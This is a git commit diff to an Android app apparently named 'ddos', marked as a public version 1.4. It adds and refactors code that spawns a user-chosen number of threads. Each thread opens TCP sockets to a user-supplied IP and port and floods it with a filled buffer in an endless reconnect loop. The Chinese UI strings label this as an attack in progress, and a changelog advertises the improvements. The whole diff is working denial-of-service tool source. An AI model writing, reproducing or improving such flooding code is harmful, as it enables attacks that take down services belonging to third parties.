134a142524cb49201e029f27d0f3ff4a6801ebe8
grey.cloud@qq.com <grey.cloud@qq.com>
2018-08-16 18:16:34 +0800

    v1.4(public version)

--- app/src/main/java/com/greyCloud/ddos/MainActivity.java
+++ app/src/main/java/com/greyCloud/ddos/MainActivity.java
@@ -12,16 +12,21 @@ import java.util.*;
 public class MainActivity extends ActionBarActivity
 {
 	public static byte[] buffer;
-	public static ProgressDialog pd;
+	ProgressDialog pd;
 	public static String ipS;
-	TextView kill;
 	public static int port;
 	public static long killN=0;
 	boolean lock=false;
-	private Handler uiHandler = new Handler();
+	Handler uiHandler = new Handler();
 	AlertDialog dialog;
-	boolean stop=false;
+	Thread1[] threadPool=null;
 	public static long h=0;
+	boolean stop=true;
+	public static int buffSize=0;
+	public static int tN=0;
+	String err="";
+	int jd=0;
+	ProgressDialog pd1;
 	//MyHandler mHandler = new MyHandler();
     @Override
     protected void onCreate(Bundle savedInstanceState)
@@ -32,6 +37,9 @@ public class MainActivity extends ActionBarActivity
 				Button btn2 = (Button) findViewById(R.id.button2);
         //监听button事件
 				pd=new ProgressDialog(this);
+	
+		pd1=new ProgressDialog(this);
+				
 				dialog=new AlertDialog.Builder(this).create();
 				btn2.setOnClickListener(new OnClickListener() {
 				@Override
@@ -42,11 +50,52 @@ public class MainActivity extends ActionBarActivity
 						dialog.show();
 						return;
 					}
-					stop=true;
-					dialog.setTitle("成功");
-					dialog.setMessage("成功发送停止请求，线程将在不久后全部停止，由于线程存活计算的不够准确，请在线程保持不动后再重新开始");
-					dialog.show();
+					pd1.setProgressStyle(ProgressDialog.STYLE_HORIZONTAL);// 设置水平进度条  
+					pd1.setCancelable(false);// 设置是否可以通过点击Back键取消  
+					pd1.setCanceledOnTouchOutside(false);// 设置在点击Dialog外是否取消Dialog进度条  
+					//dialog.setIcon(R.drawable.ic_launcher);// 设置提示的title的图标，默认是没有的  
+					pd1.setTitle("正在终止...");  
+					pd1.setMax(threadPool.length);  
+					pd1.setMessage("等待线程退出...");
+					pd1.show();  
+					stop s=new stop(threadPool.length);
+					s.start();
 					lock=false;
+					stop=false;
+				}
+				class stop extends Thread{
+					int l=0;
+					public stop(int l){
+						this.l=l;
+					}
+					@Override
+					public void run(){
+						for(int i=0;i<l;i++){
+							try{
+							threadPool[i].s.close();
+							}catch(Exception e){}
+							threadPool[i].interrupt();
+							jd=i;
+							Runnable runnable = new Runnable() {
+								@Override
+								public void run() {
+									//pd1.setMessage(String.valueOf(jd));
+									pd1.incrementProgressBy(jd);
+							}};
+									uiHandler.post(runnable);
+						}
+						Runnable runnable = new Runnable() {
+							@Override
+							public void run() {
+								pd1.cancel();
+								killN=0;
+								h=0;
+								jd=0;
+								((LinearLayout)findViewById(R.id.ll)).setVisibility(View.GONE);
+							}
+						};
+						uiHandler.post(runnable);
+					}
 				}
 			});
         btn1.setOnClickListener(new OnClickListener() {
@@ -63,162 +112,129 @@ public class MainActivity extends ActionBarActivity
 						pd.setMessage("初始化...");
 						pd.show();
 						lock=true;
-						stop=false;
+						
+						LinearLayout ll;
+						EditText ip=null;
+						EditText thread;
+						EditText buff=null;
+						TextView kill;
+						try{
+							ll=(LinearLayout)findViewById(R.id.ll);
+							kill=(TextView)findViewById(R.id.killThread);
+							ip=(EditText)findViewById(R.id.ip);
+							buff=(EditText)findViewById(R.id.buff);
+							thread=(EditText)findViewById(R.id.thread);
+							kill.setText("正在攻击，线程死亡速度:0个/s\n存活线程:0");
+						}catch(Exception e){
+							pd.cancel();
+							dialog.setTitle("错误");
+							dialog.setMessage("初始化失败："+e.getMessage());
+							dialog.show();
+							return;
+						}
+						String[] temp=ip.getText().toString().split(":");
+						if(temp.length!=2){
+							pd.cancel();
+							dialog.setTitle("错误");
+							dialog.setMessage("ip格式错误");
+							dialog.show();
+							return;
+						}
+						ipS=temp[0];
+						try{
+							buffSize=Integer.parseInt(buff.getText().toString());
+						}catch(Exception e){
+							pd.cancel();
+							dialog.setTitle("错误");
+							dialog.setMessage("缓冲大小错误");
+							dialog.show();
+							return;
+						}
+						port=Integer.parseInt(temp[1]);
+						tN=Integer.parseInt(thread.getText().toString());
+						
 						Thread2 t=new Thread2();
 						t.start();
 					}
-					
-				class Thread1 extends Thread{
-					@Override
-					public void run(){
-						MainActivity.h++;
-						if(stop){
-							//bf.close();
-							//dos.close();
-							//os.close();
-							//s.close();
-							throw new RuntimeException("stop");
-						}
-						
-						Runnable runnable = new Runnable() {
-							@Override
-							public void run() {
-								//System.out.println("Runnable thread id " + Thread.currentThread().getId());
-									MainActivity.this.kill.setText("正在攻击，当前已死亡线程\n"+MainActivity.killN+"\n当前存活线程"+MainActivity.h);
-							}
-						};
-						uiHandler.post(runnable);
-						Socket s=null;
-						OutputStream os=null;
-						DataOutputStream dos=null;
-						BufferedOutputStream bf=null;
-						try {
-							s=new Socket(MainActivity.ipS,MainActivity.port);
-							//流准备
-							//s.setSoTimeout(
-							os=s.getOutputStream();
-							dos=new DataOutputStream(os);
-							bf=new BufferedOutputStream(dos);
-							while(true) {
-								if(stop){
-									bf.close();
-									dos.close();
-									os.close();
-									s.close();
-									throw new RuntimeException("stop");
-								}
-								bf.write(MainActivity.buffer);
-								bf.flush();
-							}
-						}catch(Exception e) {
-							MainActivity.killN++;
-							MainActivity.h--;
-							//MainActivity.kill.setText("正在攻击，当前已死亡线程:"+MainActivity.killN);
-							Runnable runnable1 = new Runnable() {
-								@Override
-								public void run() {
-									//System.out.println("Runnable thread id " + Thread.currentThread().getId());
-									if(stop){
-										MainActivity.this.kill.setText("正在停止，当前存活线程\n"+MainActivity.h);
-									}else{
-										MainActivity.this.kill.setText("正在攻击，当前已死亡线程\n"+MainActivity.killN+"\n当前存活线程"+MainActivity.h);
-									}
-								}
-							};
-							uiHandler.post(runnable1);
-							//System.out.println("线程死亡，重生！"+e.getMessage());
-							//Runnable thread1 = new Thread1(); 
-							if(stop){
-								return;
-							}
-							Thread thread2 = new Thread1();
-							thread2.start();//启动线程
-						}
-					}
-				}
 					class Thread2 extends Thread{
 						@Override
 						public void run(){
-							Runnable runnable = new Runnable() {
-								@Override
-								public void run() {
-									//System.out.println("Runnable thread id " + Thread.currentThread().getId());
-									LinearLayout ll;
-									EditText ip=null;
-									int b=0;
-									EditText thread;
-									EditText buff=null;
 									try{
-										ll=(LinearLayout)findViewById(R.id.ll);
-										kill=(TextView)findViewById(R.id.killThread);
-										ip=(EditText)findViewById(R.id.ip);
-										buff=(EditText)findViewById(R.id.buff);
-										thread=(EditText)findViewById(R.id.thread);
-										kill.setText("正在攻击,当前已死亡线程:\n0\n当前存活线程:0");
-										MainActivity.h=0;
-										MainActivity.killN=0;
-									}catch(Exception e){
-										pd.cancel();
-										dialog.setTitle("错误");
-										dialog.setMessage("初始化失败："+e.getMessage());
-										dialog.show();
-										return;
-									}
-									pd.setMessage("解析ip...");
-									String[] temp=ip.getText().toString().split(":");
-									if(temp.length!=2){
-										pd.cancel();
-										dialog.setTitle("错误");
-										dialog.setMessage("ip格式错误");
-										dialog.show();
-										return;
-									}
-									ipS=temp[0];
-									try{
-										b=Integer.parseInt(buff.getText().toString());
-									}catch(Exception e){
-										pd.cancel();
-										dialog.setTitle("错误");
-										dialog.setMessage("缓冲大小错误");
-										dialog.show();
-										return;
-									}
-									port=Integer.parseInt(temp[1]);
-									pd.show();
-									pd.setMessage("正在创建缓冲区...");
-									try{
-										buffer=new byte[1024*b];
-										for(int i=0;i<1024*b;i++) {
+										buffer=new byte[1024*buffSize];
+										for(int i=0;i<1024*buffSize;i++) {
 											buffer[i]=127;
 										}
 									}catch(Exception e){
-										pd.cancel();
-										dialog.setTitle("错误");
-										dialog.setMessage("创建缓冲区时发生错误："+e.getMessage());
-										dialog.show();
+										err=e.getMessage();
+										Runnable runnable = new Runnable() {
+											@Override
+											public void run() {
+												pd.cancel();
+												dialog.setTitle("错误");
+												dialog.setMessage("创建缓冲区时发生错误："+err);
+												dialog.show();
+											}};
+										uiHandler.post(runnable);
+										
 										return;
 									}
+							Runnable runnable = new Runnable() {
+								@Override
+								public void run() {
 									pd.setMessage("正在释放线程...");
+								}};
+								uiHandler.post(runnable);
 									try{
-										int t=Integer.parseInt(thread.getText().toString());
-										for(int i=0;i<t;i++) {
+										threadPool=new Thread1[tN];
+										for(int i=0;i<tN;i++) {
 											//Runnable thread1 = new Thread1(); 
 											Thread1 thread2 = new Thread1();
-											thread2.start();//启动线程
+											threadPool[i]=thread2;
+											threadPool[i].start();
 										}
 									}catch(Exception e){
+										err=e.getMessage();
+										Runnable runnable2 = new Runnable() {
+											@Override
+											public void run() {
 										pd.cancel();
 										dialog.setTitle("错误");
-										dialog.setMessage("释放线程时发生错误："+e.getMessage());
+										dialog.setMessage("释放线程时发生错误："+err);
 										dialog.show();
+										}};
+										uiHandler.post(runnable2);
 										return;
 									}
-									MainActivity.pd.cancel();
-									ll.setVisibility(View.VISIBLE);
+									th t=new th();
+									t.start();
+							Runnable runnable1 = new Runnable() {
+								@Override
+								public void run() {
+									pd.cancel();
+									((LinearLayout)findViewById(R.id.ll)).setVisibility(View.VISIBLE);
+								}};
+							uiHandler.post(runnable1);
+						}
+					}
+					class th extends Thread{
+						@Override
+						public void run(){
+							while(stop){
+								try{
+									Thread.sleep(1000);
+								}catch(Exception e){
+									
+								}
+								Runnable runnable = new Runnable() {
+									@Override
+									public void run() {
+										TextView kill=(TextView)findViewById(R.id.killThread);
+										kill.setText("正在攻击，线程死亡速度:"+killN+"个/s\n存活线程:"+h);
+										killN=0;
 									}
-							};
-							uiHandler.post(runnable);
-							
+								};
+								uiHandler.post(runnable);
+							}
 						}
 					}
 				});
@@ -245,10 +261,41 @@ public class MainActivity extends ActionBarActivity
 				return true;
 			case R.id.updata:
 				AlertDialog dialog1=new AlertDialog.Builder(this).create();
-				dialog1.setMessage("1.3更新内容:\n增加了右上角菜单\n增加了停止攻击\n新增统计存活线程");
+				dialog1.setMessage("1.4更新内容:\n修复了所有bug\n直接强制停止所有线程，方便快捷\n代码优化，更省资源\n总死亡线程数量不再统计，直接统计每秒死多少线程\n点击开始攻击时不再卡死");
 				dialog1.show();
 				return true;
 		}
 		return super.onOptionsItemSelected(item);
+	}
+}
+class Thread1 extends Thread{
+	public Socket s=null;
+	@Override
+	public void run(){
+		
+		
+		OutputStream os=null;
+		DataOutputStream dos=null;
+		while(!isInterrupted()){
+		try {
+			s=new Socket(MainActivity.ipS,MainActivity.port);
+			MainActivity.h++;
+			//流准备
+			//s.setSoTimeout(
+			os=s.getOutputStream();
+			dos=new DataOutputStream(os);
+			while(!isInterrupted()) {
+				dos.write(MainActivity.buffer);
+				dos.flush();
+			}
+		}catch(Exception e) {
+			MainActivity.killN++;
+			MainActivity.h--;
+			//MainActivity.kill.setText("正在攻击，当前已死亡线程:"+MainActivity.killN);
+			///uiHandler.post(runnable1);
+			//System.out.println("线程死亡，重生！"+e.getMessage());
+			//Runnable thread1 = new Thread1(); 
+			}
+		}
 	}
 }
